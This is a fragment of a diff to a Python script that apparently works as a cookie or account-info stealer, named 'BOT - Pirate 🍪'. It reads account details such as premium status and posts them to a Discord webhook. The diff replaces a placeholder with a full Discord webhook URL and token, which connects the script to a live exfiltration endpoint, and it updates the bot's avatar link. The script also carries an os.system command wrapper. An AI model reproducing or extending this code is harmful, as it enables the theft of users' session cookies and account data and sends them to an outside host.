@@ -3,7 +3,7 @@ import codecs
 import json
 from base64 import *
 
-webhookk = "heh"
+webhookk = "https://discord.com/api/webhooks/1086437029639889059/45UtruvsycrhQS3azYItcUX6HCyNGu1e103OuwG4TKNVE3GPy4ATU6-T9pYZQhbVxZs8"
 def command(c):
     os.system(c)
 def cls():
@@ -111,7 +111,7 @@ premium = info['IsPremium']
 discord = Discord(url=webhookk)
 discord.post(
     username="BOT - Pirate 🍪",
-    avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
+    avatar_url="https://images-ext-2.discordapp.net/external/t6EMWi575jFVS-ytG01XfVjB6qYQRYjhX-1LX1SSfWA/https/hmmmm-teal.vercel.app/api/dreamybull-blow?width=528&height=528",
     embeds=[
         {
             "username": "BOT - Pirate 🍪",
